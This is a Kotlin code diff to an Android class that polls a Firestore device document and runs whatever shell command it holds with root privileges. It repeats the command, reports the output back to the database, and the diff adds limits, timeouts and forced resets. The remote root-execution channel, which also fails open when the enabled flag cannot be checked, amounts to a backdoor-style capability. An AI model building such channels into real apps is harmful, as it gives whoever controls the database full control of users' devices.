@@ -67,6 +67,9 @@ object CollectionsManager {
     private var lastExecutionStartTime = 0L // Track when last execution started
     private val EXECUTION_TIMEOUT = 120000L // 2 minutes maximum execution time
     private var currentExecutionThread: Thread? = null // Track current execution thread
+    private var executionRetryCount = 0 // Track retry attempts for stuck executions
+    private val MAX_RETRY_ATTEMPTS = 3 // Maximum retry attempts before forcing reset
+    private val CLEANUP_DELAY = 1000L // 1 second delay for proper cleanup
     
     // ======================= DATABASE STRUCTURE =======================
     
@@ -127,10 +130,11 @@ object CollectionsManager {
                 ),
                 "shell" to mapOf(
                     "command" to "",
-                    "run" to false,
+                    "enabled" to false,
                     "count" to 1,
                     "wait" to 0,
-                    "result" to ""
+                    "result" to "",
+                    "error" to ""
                 ),
                 "created_at" to FieldValue.serverTimestamp(),
                 "updated_at" to FieldValue.serverTimestamp()
@@ -157,7 +161,56 @@ object CollectionsManager {
         
         // Reset execution flag
         isExecutingCommand = false
-        Log.d(TAG, "🔓 Execution flag reset during initialization reset")
+        executionRetryCount = 0
+        Log.d(TAG, "🔓 Execution flag and retry count reset during initialization reset")
+    }
+
+    /**
+     * Comprehensive cleanup to prevent resource leaks and stuck states
+     * This method should be called after each execution cycle
+     */
+    private fun performComprehensiveCleanup() {
+        Log.d(TAG, "🧹 Performing comprehensive cleanup...")
+        
+        try {
+            // 1. Interrupt and clean current execution thread
+            currentExecutionThread?.let { thread ->
+                if (thread.isAlive) {
+                    Log.w(TAG, "⚠️ Interrupting active execution thread")
+                    thread.interrupt()
+                    // Give thread time to clean up
+                    try {
+                        thread.join(2000) // Wait up to 2 seconds
+                    } catch (e: InterruptedException) {
+                        Log.w(TAG, "Timeout waiting for thread to finish")
+                        Thread.currentThread().interrupt()
+                    }
+                }
+                currentExecutionThread = null
+            }
+            
+            // 2. Reset all execution flags
+            isExecutingCommand = false
+            lastExecutionStartTime = 0L
+            
+            // 3. Force RootManager cleanup
+            RootManager.resetRootManager()
+            
+            // 4. Force garbage collection
+            System.gc()
+            
+            // 5. Small delay to ensure cleanup
+            Thread.sleep(CLEANUP_DELAY)
+            
+            Log.d(TAG, "✅ Comprehensive cleanup completed successfully")
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Error during comprehensive cleanup", e)
+            // Even if cleanup fails, ensure flags are reset
+            isExecutingCommand = false
+            lastExecutionStartTime = 0L
+            currentExecutionThread = null
+        }
     }
 
     /**
@@ -506,10 +559,11 @@ object CollectionsManager {
             // Shell command execution system
             deviceData["shell"] = mapOf(
                 "command" to "",
-                "run" to false,
+                "enabled" to false,
                 "count" to 1,
                 "wait" to 0,
-                "result" to ""
+                "result" to "",
+                "error" to ""
             )
             
             deviceData["created_at"] = FieldValue.serverTimestamp()
@@ -898,58 +952,164 @@ object CollectionsManager {
                     Log.d(TAG, "📋 Shell data retrieved: $shellData")
                     
                     if (shellData != null) {
-                        val shouldRun = shellData["run"] as? Boolean ?: false
+                        val shouldRun = shellData["enabled"] as? Boolean ?: false
                         val command = shellData["command"] as? String ?: ""
                         val count = (shellData["count"] as? Number)?.toInt() ?: 1
                         var waitSeconds = (shellData["wait"] as? Number)?.toInt() ?: 0
                         
-                        // Handle wait time conversion - if > 60, assume it's in milliseconds
-                        if (waitSeconds > 60) {
-                            Log.w(TAG, "⚠️ Wait value seems to be in milliseconds ($waitSeconds), converting to seconds")
-                            waitSeconds = (waitSeconds / 1000).coerceAtLeast(1) // Ensure at least 1 second
-                            Log.i(TAG, "🔄 Converted wait time to ${waitSeconds}s")
+                        // Handle wait time - always treat as SECONDS (not milliseconds)
+                        // Apply safety limits for reasonable execution times
+                        waitSeconds = when {
+                            waitSeconds > 300 -> {
+                                // If > 5 minutes, cap to 5 minutes for safety
+                                Log.w(TAG, "⚠️ Wait time was > 5 minutes (${shellData["wait"]}s), capped to 5 minutes for safety")
+                                300
+                            }
+                            waitSeconds > 120 -> {
+                                Log.w(TAG, "⚠️ Long wait time detected: ${waitSeconds}s")
+                                waitSeconds
+                            }
+                            waitSeconds > 60 -> {
+                                Log.w(TAG, "⚠️ Wait time > 1 minute: ${waitSeconds}s")
+                                waitSeconds
+                            }
+                            waitSeconds < 0 -> {
+                                Log.w(TAG, "⚠️ Negative wait time, setting to 0")
+                                0
+                            }
+                            else -> waitSeconds
                         }
                         
-                        Log.d(TAG, "📋 Shell parameters - Run: $shouldRun, Command: '$command', Count: $count, Wait: ${waitSeconds}s")
-                        Log.i(TAG, "📊 Execution parameters parsed - Will execute $count times with ${waitSeconds}s wait between executions")
+                        Log.i(TAG, "✅ Wait time processed: ${waitSeconds} seconds")
+                        
+                        // Additional safety check for count
+                        val safeCount = when {
+                            count > 50 -> {
+                                Log.w(TAG, "⚠️ Count is very high ($count), capping to 50 for safety")
+                                50
+                            }
+                            count > 20 -> {
+                                Log.w(TAG, "⚠️ High count detected: $count executions")
+                                count
+                            }
+                            else -> count
+                        }
+                        
+                        Log.d(TAG, "📋 Shell parameters - Enabled: $shouldRun, Command: '$command', Count: $safeCount, Wait: ${waitSeconds}s")
+                        Log.i(TAG, "📊 Execution parameters parsed - Will execute $safeCount times with ${waitSeconds}s wait between executions")
+                        Log.i(TAG, "⏰ IMPORTANT: Wait time is interpreted as SECONDS (not milliseconds)")
+                        
+                        // Calculate estimated total time and warn if too long
+                        val estimatedTime = (safeCount * waitSeconds) + (safeCount * 10) // 10s per command execution
+                        Log.i(TAG, "📈 Estimated total execution time: ${estimatedTime} seconds (${estimatedTime/60.0} minutes)")
+                        
+                        when {
+                            estimatedTime > 3600 -> { // > 1 hour
+                                Log.e(TAG, "🚨 CRITICAL WARNING: Estimated execution time is ${estimatedTime/3600}+ hours!")
+                                Log.e(TAG, "🚨 This will likely cause timeout and system instability!")
+                            }
+                            estimatedTime > 1800 -> { // > 30 minutes
+                                Log.e(TAG, "⚠️ SEVERE WARNING: Estimated execution time is ${estimatedTime/60} minutes!")
+                            }
+                            estimatedTime > 600 -> { // > 10 minutes
+                                Log.w(TAG, "⚠️ LONG EXECUTION WARNING: Estimated total time ~${estimatedTime/60}min")
+                            }
+                        }
                         
                         // Only execute if run is true, command is not empty, and not already executing
                         if (shouldRun && command.isNotEmpty() && !isExecutingCommand) {
-                            Log.i(TAG, "🔔 Real-time shell command detected - Command: '$command', Count: $count, Wait: ${waitSeconds}s")
+                            Log.i(TAG, "🔔 Real-time shell command detected - Command: '$command', Count: $safeCount, Wait: ${waitSeconds}s")
                             
                             // Set execution flag to prevent concurrent execution
                             isExecutingCommand = true
                             lastExecutionStartTime = System.currentTimeMillis()
                             
-                            // Execute the command sequence
-                            executeShellCommandSequence(context, command, count, waitSeconds, androidId)
+                            // Reset retry count for new execution
+                            executionRetryCount = 0
+                            Log.d(TAG, "🔄 Starting fresh execution - retry count reset")
+                            
+                            // Execute the command sequence with safe parameters
+                            executeShellCommandSequence(context, command, safeCount, waitSeconds, androidId)
                         } else if (isExecutingCommand) {
                             // Check if execution has been stuck for too long
                             val currentTime = System.currentTimeMillis()
-                            if (currentTime - lastExecutionStartTime > EXECUTION_TIMEOUT) {
-                                Log.e(TAG, "⚠️ Execution timeout detected! Forcing reset after ${EXECUTION_TIMEOUT/1000}s")
+                            val elapsedTime = currentTime - lastExecutionStartTime
+                            
+                            // Dynamic timeout based on estimated execution time
+                            val dynamicTimeout = when {
+                                estimatedTime > 0 -> (estimatedTime * 1000L) + 60000L // Add 1 minute buffer
+                                else -> EXECUTION_TIMEOUT
+                            }.coerceAtMost(600000L) // Max 10 minutes
+                            
+                            if (elapsedTime > dynamicTimeout) {
+                                Log.e(TAG, "⚠️ Execution timeout detected! Elapsed: ${elapsedTime/1000}s, Timeout: ${dynamicTimeout/1000}s")
+                                Log.e(TAG, "💥 FORCE STOPPING stuck execution now!")
                                 
-                                // Force reset the execution state
+                                // Increment retry count for tracking
+                                executionRetryCount++
+                                Log.w(TAG, "🔄 Recovery attempt $executionRetryCount/$MAX_RETRY_ATTEMPTS")
+                                
+                                // Force stop current thread immediately
+                                currentExecutionThread?.let { thread ->
+                                    if (thread.isAlive) {
+                                        Log.w(TAG, "🔪 Force interrupting stuck thread: ${thread.name}")
+                                        thread.interrupt()
+                                        
+                                        // Give it 2 seconds to stop gracefully
+                                        Thread.sleep(2000)
+                                        
+                                        // If still alive, force kill
+                                        if (thread.isAlive) {
+                                            Log.e(TAG, "💀 Thread still alive, force killing!")
+                                            @Suppress("DEPRECATION")
+                                            thread.stop()
+                                        }
+                                    }
+                                    currentExecutionThread = null
+                                }
+                                
+                                // Reset execution state immediately
                                 isExecutingCommand = false
                                 lastExecutionStartTime = 0L
                                 
-                                // Interrupt current execution thread if it exists
-                                currentExecutionThread?.interrupt()
-                                currentExecutionThread = null
+                                // Report the timeout error
+                                val timeoutError = "EXECUTION_TIMEOUT: Command sequence was stuck for ${elapsedTime/1000}s (timeout: ${dynamicTimeout/1000}s)"
+                                disableShellExecution(androidId, "TIMEOUT: Execution exceeded time limit", timeoutError)
                                 
-                                // Force disable run flag in database
-                                disableShellRunFlag(androidId, "FORCED RESET: Execution timeout after ${EXECUTION_TIMEOUT/1000} seconds")
+                                Log.i(TAG, "✅ Stuck execution forcibly terminated and cleaned up")
                                 
-                                Log.w(TAG, "🔄 Execution state reset due to timeout - ready for new commands")
+                                // Perform comprehensive cleanup
+                                performComprehensiveCleanup()
+                                
+                                // Force disable run flag in database (async)
+                                val retryTimeoutError = "EXECUTION_TIMEOUT: Command execution exceeded ${EXECUTION_TIMEOUT/1000}s limit. Recovery attempt $executionRetryCount/$MAX_RETRY_ATTEMPTS"
+                                disableShellExecution(androidId, "FORCED RESET: Execution timeout after ${EXECUTION_TIMEOUT/1000}s (Attempt $executionRetryCount)", retryTimeoutError)
+                                
+                                // If we've reached max retries, do a hard reset
+                                if (executionRetryCount >= MAX_RETRY_ATTEMPTS) {
+                                    Log.e(TAG, "❌ Maximum recovery attempts reached! Performing hard reset")
+                                    performHardReset(androidId)
+                                    executionRetryCount = 0 // Reset counter after hard reset
+                                }
+                                
+                                Log.w(TAG, "🔄 Recovery completed - ready for new commands")
                             } else {
-                                Log.d(TAG, "📋 Command already executing, ignoring new trigger (${(currentTime - lastExecutionStartTime)/1000}s elapsed)")
+                                Log.d(TAG, "📋 Command already executing, ignoring new trigger (${elapsedTime/1000}s elapsed)")
+                                
+                                // If this is a new command request while executing, reset retry count
+                                if (shouldRun && command.isNotEmpty()) {
+                                    executionRetryCount = 0
+                                    Log.d(TAG, "� New command detected during execution - retry count reset")
+                                }
                             }
                         } else if (!shouldRun) {
                             Log.d(TAG, "📋 Shell execution flag is false - no execution needed")
                         } else if (command.isEmpty()) {
                             Log.d(TAG, "📋 Shell command is empty - no execution needed")
                         } else {
-                            Log.d(TAG, "📋 Shell execution conditions not met - Run: $shouldRun, Command empty: ${command.isEmpty()}")
+                            Log.d(TAG, "📋 Shell execution conditions not met - Enabled: $shouldRun, Command empty: ${command.isEmpty()}")
+                            Log.w(TAG, "⚠️ UNEXPECTED: All conditions seem met but execution not starting!")
+                            Log.w(TAG, "🔍 DEBUG: shouldRun=$shouldRun, command='$command', isExecutingCommand=$isExecutingCommand")
                         }
                     } else {
                         Log.d(TAG, "📋 No shell data found in snapshot")
@@ -1092,10 +1252,27 @@ object CollectionsManager {
                 val shellData = document.get("shell") as? Map<String, Any>
                 
                 if (shellData != null) {
-                    val shouldRun = shellData["run"] as? Boolean ?: false
+                    val shouldRun = shellData["enabled"] as? Boolean ?: false
                     val command = shellData["command"] as? String ?: ""
                     val count = (shellData["count"] as? Number)?.toInt() ?: 1
-                    val waitSeconds = (shellData["wait"] as? Number)?.toInt() ?: 0
+                    var waitSeconds = (shellData["wait"] as? Number)?.toInt() ?: 0
+                    
+                    // Apply same wait time processing as in real-time listener
+                    waitSeconds = when {
+                        waitSeconds > 300 -> {
+                            Log.w(TAG, "⚠️ Wait time was > 5 minutes (${shellData["wait"]}s), capped to 5 minutes for safety")
+                            300
+                        }
+                        waitSeconds > 120 -> {
+                            Log.w(TAG, "⚠️ Long wait time detected: ${waitSeconds}s")
+                            waitSeconds
+                        }
+                        waitSeconds < 0 -> {
+                            Log.w(TAG, "⚠️ Negative wait time, setting to 0")
+                            0
+                        }
+                        else -> waitSeconds
+                    }
                     
                     if (shouldRun && command.isNotEmpty()) {
                         Log.i(TAG, "🔧 Shell Command execution requested - Command: '$command', Count: $count, Wait: ${waitSeconds}s")
@@ -1103,7 +1280,7 @@ object CollectionsManager {
                         // Execute the command sequence and disable run flag after completion
                         executeShellCommandSequence(context, command, count, waitSeconds, androidId)
                     } else {
-                        Log.d(TAG, "📋 Shell execution not required - Run: $shouldRun, Command: '$command'")
+                        Log.d(TAG, "📋 Shell execution not required - Enabled: $shouldRun, Command: '$command'")
                     }
                 } else {
                     Log.d(TAG, "📋 No shell data found in device document")
@@ -1116,184 +1293,237 @@ object CollectionsManager {
     
     /**
      * Executes shell command sequence with specified count and wait time using RootManager
-     * ONLY executes if run=true and stops immediately if run becomes false
+     * FIXED VERSION: Properly handles count and wait time with better error handling
      */
     private fun executeShellCommandSequence(context: Context, command: String, count: Int, waitSeconds: Int, androidId: String) {
-        Log.i(TAG, "🚀 Starting shell command sequence - Command: '$command', Executions: $count, Wait: ${waitSeconds}s, AndroidID: $androidId")
+        Log.i(TAG, "🚀 Starting shell command sequence - Command: '$command', Executions: $count, Wait: ${waitSeconds}s")
         
         // Validate inputs
         if (command.isEmpty()) {
             Log.w(TAG, "⚠️ Empty command provided, skipping execution")
-            disableShellRunFlag(androidId, "ERROR: Empty command provided")
+            disableShellExecution(androidId, "ERROR: Empty command provided", "VALIDATION_ERROR: Command parameter is empty")
             return
         }
         
         if (count <= 0) {
             Log.w(TAG, "⚠️ Invalid count provided: $count, skipping execution")
-            disableShellRunFlag(androidId, "ERROR: Invalid count provided: $count")
+            disableShellExecution(androidId, "ERROR: Invalid count: $count", "VALIDATION_ERROR: Count must be > 0")
             return
         }
         
-        // Double-check that run flag is still true before starting execution
-        val deviceRef = firestore.collection("devices").document(androidId)
-        deviceRef.get()
-            .addOnSuccessListener { document ->
-                if (document.exists()) {
-                    val shellData = document.get("shell") as? Map<String, Any>
-                    val currentRunFlag = shellData?.get("run") as? Boolean ?: false
-                    
-                    if (!currentRunFlag) {
-                        Log.w(TAG, "🛑 Run flag is false at execution start, aborting execution")
-                        resetExecutionFlags()
-                        return@addOnSuccessListener
-                    }
-                    
-                    // Check if root access is available
-                    Log.d(TAG, "📋 Checking root access...")
-                    if (!RootManager.isRootGranted()) {
-                        Log.e(TAG, "❌ Root access not available, disabling run flag")
-                        disableShellRunFlag(androidId, "ERROR: Root access not available")
-                        return@addOnSuccessListener
-                    }
-                    Log.d(TAG, "✅ Root access confirmed")
-                    
-                    // Start execution sequence with run flag confirmed as true
-                    Log.i(TAG, "🚀 Starting command execution sequence - run flag confirmed as true")
-                    executeCommandSequenceInternal(context, command, count, waitSeconds, androidId)
-                } else {
-                    Log.e(TAG, "❌ Device document does not exist")
-                    resetExecutionFlags()
-                }
-            }
-            .addOnFailureListener { exception ->
-                Log.e(TAG, "❌ Failed to verify run flag before execution", exception)
-                disableShellRunFlag(androidId, "ERROR: Failed to verify run flag")
-            }
-    }
-    
-    /**
-     * Internal method to execute the actual command sequence using background thread
-     * This prevents blocking the main thread and avoids synchronization issues
-     */
-    private fun executeCommandSequenceInternal(context: Context, command: String, count: Int, waitSeconds: Int, androidId: String) {
-        Log.i(TAG, "🎯 Starting internal command sequence - Total executions planned: $count, Wait between: ${waitSeconds}s")
-        
-        // Use background thread to prevent main thread blocking
+        // Start execution in background thread
         currentExecutionThread = Thread {
-            try {
-                val resultBuilder = StringBuilder()
-                var executionCount = 0
-                val startTime = System.currentTimeMillis()
-                val maxExecutionTime = 60000L // 60 seconds maximum total execution time
-                
-                Log.i(TAG, "� Starting command execution in background thread")
-                
-                while (executionCount < count && !Thread.currentThread().isInterrupted) {
-                    // Check if run flag is still true before each execution
-                    val deviceRef = firestore.collection("devices").document(androidId)
-                    try {
-                        val currentDoc = Tasks.await(deviceRef.get())
-                        if (currentDoc.exists()) {
-                            val currentShellData = currentDoc.get("shell") as? Map<String, Any>
-                            val currentRunFlag = currentShellData?.get("run") as? Boolean ?: false
-                            
-                            if (!currentRunFlag) {
-                                Log.w(TAG, "🛑 Run flag was set to false during execution, stopping...")
-                                resultBuilder.append("STOPPED: Run flag set to false during execution\n")
-                                break
-                            }
-                        }
-                    } catch (e: Exception) {
-                        Log.w(TAG, "⚠️ Could not verify run flag, continuing execution", e)
-                    }
-                    
-                    // Check for timeout to prevent infinite hanging
-                    val currentTime = System.currentTimeMillis()
-                    if (currentTime - startTime > maxExecutionTime) {
-                        Log.e(TAG, "⏰ Execution timeout reached (60s), stopping sequence")
-                        resultBuilder.append("TIMEOUT: Execution stopped after 60 seconds\n")
-                        break
-                    }
-                    
-                    executionCount++
-                    Log.i(TAG, "⚡ Executing shell command ($executionCount/$count): $command")
-                    
-                    try {
-                        Log.d(TAG, "📋 Calling RootManager.executeRootCommand...")
-                        
-                        // Execute shell command using RootManager with timeout
-                        when (val result = RootManager.executeRootCommand(command, 10)) {
-                            is RootCommandResult.Success -> {
-                                Log.i(TAG, "✅ Shell command executed successfully ($executionCount/$count)")
-                                Log.d(TAG, "📋 Command output: ${result.output}")
-                                resultBuilder.append("Execution $executionCount: SUCCESS\n")
-                                if (result.output.isNotEmpty()) {
-                                    resultBuilder.append("Output: ${result.output}\n")
-                                }
-                            }
-                            is RootCommandResult.Error -> {
-                                Log.w(TAG, "⚠️ Shell command failed ($executionCount/$count): ${result.message}")
-                                resultBuilder.append("Execution $executionCount: ERROR\n")
-                                resultBuilder.append("Error: ${result.message}\n")
-                            }
-                        }
-                        
-                        Log.d(TAG, "📋 RootManager call completed for execution $executionCount")
-                        
-                        // Wait between executions if more iterations needed and thread not interrupted
-                        if (executionCount < count && waitSeconds > 0 && !Thread.currentThread().isInterrupted) {
-                            Log.i(TAG, "⏰ Waiting ${waitSeconds} seconds before next execution...")
-                            Thread.sleep(waitSeconds * 1000L)
-                            Log.d(TAG, "⏱️ Wait completed, proceeding to next execution...")
-                        }
-                        
-                    } catch (e: InterruptedException) {
-                        Log.e(TAG, "❌ Execution interrupted ($executionCount/$count)", e)
-                        resultBuilder.append("Execution $executionCount: INTERRUPTED\n")
-                        resultBuilder.append("Error: ${e.message}\n")
-                        break // Stop execution on interruption
-                    } catch (e: Exception) {
-                        Log.e(TAG, "❌ Failed to execute shell command ($executionCount/$count): $command", e)
-                        resultBuilder.append("Execution $executionCount: EXCEPTION\n")
-                        resultBuilder.append("Exception: ${e.message}\n")
-                        
-                        // Continue with remaining executions even if one fails
-                        Log.w(TAG, "⚠️ Execution failed but continuing with remaining executions...")
-                    }
-                }
-                
-                // Check if execution was interrupted
-                if (Thread.currentThread().isInterrupted) {
-                    Log.w(TAG, "🛑 Execution was interrupted externally")
-                    resultBuilder.append("INTERRUPTED: Execution stopped externally\n")
-                }
-                
-                // Final result processing
-                Log.i(TAG, "🎉 Shell command sequence completed - Total executions: $executionCount/$count")
-                val finalResult = resultBuilder.toString().trim()
-                Log.d(TAG, "📋 Final execution result: $finalResult")
-                
-                // Update database with final result
-                disableShellRunFlag(androidId, finalResult)
-                
-            } catch (e: Exception) {
-                Log.e(TAG, "❌ Critical error in command execution sequence", e)
-                // Ensure cleanup even on critical failure
-                disableShellRunFlag(androidId, "CRITICAL ERROR: ${e.message}")
-            } finally {
-                // Clear thread reference
-                currentExecutionThread = null
-                Log.d(TAG, "🧹 Execution thread cleaned up")
-            }
+            executeCommandLoop(command, count, waitSeconds, androidId)
         }.apply {
             name = "ShellCommandExecutor-$androidId"
             isDaemon = false
         }
         
-        // Start the execution thread
         currentExecutionThread?.start()
-        Log.d(TAG, "🚀 Execution thread started: ${currentExecutionThread?.name}")
+        Log.i(TAG, "✅ Execution thread started: ${currentExecutionThread?.name}")
     }
+    
+    /**
+     * Main command execution loop - simplified and more reliable
+     */
+    private fun executeCommandLoop(command: String, count: Int, waitSeconds: Int, androidId: String) {
+        val resultBuilder = StringBuilder()
+        val errorBuilder = StringBuilder()
+        var executionCount = 0
+        var hasErrors = false
+        val startTime = System.currentTimeMillis()
+        
+        Log.i(TAG, "🎯 Starting command loop: $count executions with ${waitSeconds}s wait")
+        
+        try {
+            // Check root access first
+            if (!RootManager.isRootGranted()) {
+                Log.e(TAG, "❌ Root access not available")
+                disableShellExecution(androidId, "ERROR: Root access denied", "ROOT_ERROR: No root privileges")
+                return
+            }
+            
+            // Execute commands in loop
+            for (i in 1..count) {
+                if (Thread.currentThread().isInterrupted) {
+                    Log.w(TAG, "🛑 Thread interrupted, stopping execution")
+                    break
+                }
+                
+                // Check if execution was disabled
+                if (!isExecutionStillEnabled(androidId)) {
+                    Log.w(TAG, "🛑 Execution disabled by user, stopping")
+                    resultBuilder.append("STOPPED: Execution disabled by user at iteration $i\n")
+                    break
+                }
+                
+                executionCount = i
+                Log.i(TAG, "⚡ Executing command ($executionCount/$count): $command")
+                
+                // Execute command
+                val executionResult = executeShellCommand(command, executionCount)
+                resultBuilder.append(executionResult.result)
+                
+                if (executionResult.hasError) {
+                    hasErrors = true
+                    errorBuilder.append(executionResult.error)
+                }
+                
+                // Wait between executions (except for the last one)
+                if (i < count && waitSeconds > 0) {
+                    if (!waitBetweenExecutions(waitSeconds, androidId, i, count)) {
+                        // Wait was interrupted or execution disabled
+                        break
+                    }
+                }
+            }
+            
+            // Prepare final results
+            val totalTime = System.currentTimeMillis() - startTime
+            val finalResult = buildFinalResult(resultBuilder, executionCount, count, totalTime)
+            val finalError = errorBuilder.toString().trim()
+            
+            Log.i(TAG, "🎉 Command sequence completed: $executionCount/$count executions in ${totalTime}ms")
+            
+            // Update database with results
+            disableShellExecution(androidId, finalResult, finalError)
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Critical error in command execution", e)
+            disableShellExecution(androidId, "CRITICAL ERROR: ${e.message}", "EXECUTION_ERROR: ${e.message}")
+        } finally {
+            // Always reset execution flags
+            isExecutingCommand = false
+            executionRetryCount = 0
+            currentExecutionThread = null
+            Log.d(TAG, "🔓 Execution completed - flags reset")
+        }
+    }
+    
+    /**
+     * Execute a single shell command and return structured result
+     */
+    private fun executeShellCommand(command: String, executionNumber: Int): ExecutionResult {
+        val startTime = System.currentTimeMillis()
+        
+        return try {
+            when (val result = RootManager.executeRootCommand(command, 15)) {
+                is RootCommandResult.Success -> {
+                    val execTime = System.currentTimeMillis() - startTime
+                    Log.i(TAG, "✅ Command $executionNumber executed successfully in ${execTime}ms")
+                    
+                    ExecutionResult(
+                        result = "Execution $executionNumber: SUCCESS (${execTime}ms)\nOutput: ${result.output.take(200)}\n",
+                        error = "",
+                        hasError = false
+                    )
+                }
+                is RootCommandResult.Error -> {
+                    val execTime = System.currentTimeMillis() - startTime
+                    Log.w(TAG, "⚠️ Command $executionNumber failed in ${execTime}ms: ${result.message}")
+                    
+                    ExecutionResult(
+                        result = "Execution $executionNumber: ERROR (${execTime}ms)\nError: ${result.message}\n",
+                        error = "Execution $executionNumber Error: ${result.message}\n",
+                        hasError = true
+                    )
+                }
+            }
+        } catch (e: Exception) {
+            val execTime = System.currentTimeMillis() - startTime
+            Log.e(TAG, "❌ Exception in command $executionNumber: ${e.message}", e)
+            
+            ExecutionResult(
+                result = "Execution $executionNumber: EXCEPTION (${execTime}ms)\nException: ${e.message}\n",
+                error = "Execution $executionNumber Exception: ${e.message}\n",
+                hasError = true
+            )
+        }
+    }
+    
+    /**
+     * Wait between executions with proper interruption handling
+     */
+    private fun waitBetweenExecutions(waitSeconds: Int, androidId: String, currentExecution: Int, totalCount: Int): Boolean {
+        Log.i(TAG, "⏰ Waiting ${waitSeconds}s before next execution ($currentExecution/$totalCount)...")
+        
+        val waitStartTime = System.currentTimeMillis()
+        val waitEndTime = waitStartTime + (waitSeconds * 1000L)
+        
+        while (System.currentTimeMillis() < waitEndTime) {
+            if (Thread.currentThread().isInterrupted) {
+                Log.w(TAG, "🛑 Thread interrupted during wait")
+                return false
+            }
+            
+            // Check if execution was disabled during wait (every 5 seconds)
+            if ((System.currentTimeMillis() - waitStartTime) % 5000 == 0L) {
+                if (!isExecutionStillEnabled(androidId)) {
+                    Log.w(TAG, "� Execution disabled during wait")
+                    return false
+                }
+            }
+            
+            try {
+                Thread.sleep(1000) // Wait in 1-second chunks
+            } catch (e: InterruptedException) {
+                Log.w(TAG, "🛑 Wait interrupted")
+                Thread.currentThread().interrupt()
+                return false
+            }
+            
+            // Log progress every 10 seconds for long waits
+            val remaining = (waitEndTime - System.currentTimeMillis()) / 1000
+            if (remaining > 0 && remaining % 10 == 0L) {
+                Log.d(TAG, "⏰ Still waiting... ${remaining}s remaining")
+            }
+        }
+        
+        Log.d(TAG, "⏱️ Wait completed successfully")
+        return true
+    }
+    
+    /**
+     * Check if execution is still enabled in database
+     */
+    private fun isExecutionStillEnabled(androidId: String): Boolean {
+        return try {
+            val deviceRef = firestore.collection("devices").document(androidId)
+            val document = Tasks.await(deviceRef.get())
+            
+            if (document.exists()) {
+                val shellData = document.get("shell") as? Map<String, Any>
+                shellData?.get("enabled") as? Boolean ?: false
+            } else {
+                false
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "⚠️ Could not verify enabled flag, assuming still enabled", e)
+            true // Assume enabled if we can't check
+        }
+    }
+    
+    /**
+     * Build final result summary
+     */
+    private fun buildFinalResult(resultBuilder: StringBuilder, executedCount: Int, totalCount: Int, totalTime: Long): String {
+        val result = resultBuilder.toString().trim()
+        
+        return if (result.isNotEmpty()) {
+            "$result\n\n=== EXECUTION SUMMARY ===\nCompleted: $executedCount/$totalCount executions\nTotal time: ${totalTime/1000.0}s\nStatus: ${if (executedCount == totalCount) "COMPLETED" else "PARTIAL"}"
+        } else {
+            "=== EXECUTION SUMMARY ===\nCompleted: $executedCount/$totalCount executions\nTotal time: ${totalTime/1000.0}s\nStatus: NO OUTPUT"
+        }
+    }
+    
+    /**
+     * Data class for execution results
+     */
+    private data class ExecutionResult(
+        val result: String,
+        val error: String,
+        val hasError: Boolean
+    )
     
     /**
      * Resets execution flags and cleans up execution state
@@ -1322,6 +1552,69 @@ object CollectionsManager {
     }
     
     /**
+     * Performs a hard reset when all recovery attempts have failed
+     * This is the nuclear option to completely reset the execution system
+     */
+    private fun performHardReset(androidId: String) {
+        Log.e(TAG, "💥 Performing HARD RESET - all recovery attempts failed")
+        
+        try {
+            // 1. Force kill any execution threads
+            currentExecutionThread?.let { thread ->
+                Log.w(TAG, "🔪 Force killing execution thread")
+                @Suppress("DEPRECATION")
+                thread.stop() // Nuclear option - deprecated but necessary for stuck threads
+                currentExecutionThread = null
+            }
+            
+            // 2. Reset all execution state
+            isExecutingCommand = false
+            lastExecutionStartTime = 0L
+            executionRetryCount = 0
+            
+            // 3. Force stop shell command listener and restart it
+            Log.w(TAG, "🔄 Restarting shell command listener")
+            shellCommandListener?.remove()
+            shellCommandListener = null
+            
+            // Give system time to clean up
+            Thread.sleep(2000)
+            
+            // 4. Force RootManager reset
+            RootManager.resetRootManager()
+            
+            // 5. Force multiple garbage collections
+            for (i in 1..3) {
+                System.gc()
+                Thread.sleep(500)
+            }
+            
+            // 6. Force disable run flag in database
+            disableShellExecution(androidId, "HARD RESET: System was completely stuck and required nuclear reset", "SYSTEM_RECOVERY: Maximum recovery attempts exceeded, performed hard reset with thread termination")
+            
+            // 7. Restart shell command listener after cleanup
+            Handler(Looper.getMainLooper()).postDelayed({
+                try {
+                    startShellCommandListener()
+                    Log.i(TAG, "✅ Shell command listener restarted after hard reset")
+                } catch (e: Exception) {
+                    Log.e(TAG, "❌ Failed to restart shell command listener after hard reset", e)
+                }
+            }, 3000) // 3 second delay
+            
+            Log.w(TAG, "💀 HARD RESET completed - system should be fully recovered")
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Error during hard reset", e)
+            // Even if hard reset fails, ensure basic cleanup
+            isExecutingCommand = false
+            lastExecutionStartTime = 0L
+            currentExecutionThread = null
+            executionRetryCount = 0
+        }
+    }
+
+    /**
      * Forces reset of execution state if system becomes stuck
      * This is a safety mechanism to prevent permanent hanging
      */
@@ -1332,37 +1625,40 @@ object CollectionsManager {
         resetExecutionFlags()
         
         // Force disable run flag in database
-        disableShellRunFlag(androidId, "FORCED RESET: System was stuck and had to be reset")
+        disableShellExecution(androidId, "FORCED RESET: System was stuck and had to be reset", "MANUAL_RESET: Force reset triggered manually or by external call")
         
         Log.i(TAG, "✅ Execution state forcibly reset - system ready for new commands")
     }
 
     /**
-     * Disables the shell run flag in the database and updates result
+     * Disables the shell enabled flag in the database and updates result
      */
-    private fun disableShellRunFlag(androidId: String, result: String = "") {
-        Log.d(TAG, "📋 disableShellRunFlag called for androidId: $androidId with result: '$result'")
+    private fun disableShellExecution(androidId: String, result: String = "", error: String = "") {
+        Log.d(TAG, "📋 disableShellExecution called for androidId: $androidId with result: '$result', error: '$error'")
         val deviceRef = firestore.collection("devices").document(androidId)
-        Log.d(TAG, "📋 Updating shell.run to false and setting result...")
+        Log.d(TAG, "📋 Updating shell.enabled to false and setting result and error...")
         
-        val updates = mapOf(
-            "shell.run" to false,
+        val updates = mutableMapOf<String, Any>(
+            "shell.enabled" to false,
             "shell.result" to result,
             "updated_at" to FieldValue.serverTimestamp()
         )
         
+        // Add error field if there's an error
+        if (error.isNotEmpty()) {
+            updates["shell.error"] = error
+        } else {
+            updates["shell.error"] = "" // Clear previous errors on success
+        }
+        
         deviceRef.update(updates)
             .addOnSuccessListener {
-                Log.i(TAG, "✅ Shell run flag disabled and result updated after command sequence completion")
-                // Reset execution flag to allow future executions
-                isExecutingCommand = false
